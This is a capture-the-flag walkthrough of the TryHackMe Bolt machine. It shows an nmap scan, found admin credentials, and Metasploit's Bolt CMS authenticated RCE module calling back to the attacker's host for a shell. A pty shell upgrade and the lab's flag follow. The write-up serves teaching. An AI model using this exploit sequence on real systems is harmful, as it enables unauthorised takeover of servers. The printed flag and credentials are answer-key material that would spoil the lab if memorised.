---
title: "Tryhackme - Bolt WriteUp"
date: 2020-10-18
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---


# TryHackMe - Bolt WriteUp

Hello, everyone. Today I will share my notes from Bolt vulnerable machine. I will try to share only the main points during the process.

**Keywords:** Bolt CMS, Metasploit, 


First of all, we do **nmap** scan.
```
root@kali:~/TryHackMe/Bolt# nmap -sV 10.10.27.14
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    (PHP 7.2.32-1)
```

From website, we find these credentials: **bolt:boltadmin123**

Then we use **Metasploit**
```
msf5 > search -d Bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
   1  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution

...
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.27.14
RHOSTS => 10.10.27.14
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST tun0
LHOST => 10.11.19.26
msf5 exploit(unix/webapp/bolt_authenticated_rce) > exploit

python3 -c "import pty; pty.spawn('/bin/bash')"
root@bolt:~# updatedb
root@bolt:~# locate flag.txt
/home/flag.txt
root@bolt:~# cat /home/flag.txt
cat /home/flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
root@bolt:~# 
```
